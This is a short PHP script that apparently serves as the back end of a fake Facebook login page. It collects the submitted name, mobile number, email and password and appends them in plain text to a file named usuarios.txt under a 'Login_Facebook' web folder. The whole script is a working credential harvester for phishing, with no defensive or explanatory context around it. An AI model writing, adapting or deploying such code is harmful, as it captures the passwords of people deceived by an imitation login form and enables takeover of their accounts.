<?php

$txt = "usuarios.txt"; 

$arquivo = fopen($txt, 'a+'); 

   $txt="\r\n".$_POST['nome'].' - '.$_POST['celular'].' - '.$_POST['email'].' - '.$_POST['senha'];

   file_put_contents('C:\xampp\xamp\htdocs\Login_Facebook\usuarios.txt',$txt,FILE_APPEND);    

    fwrite($arquivo,$txt);
    fclose($arquivo); 
   
    ?>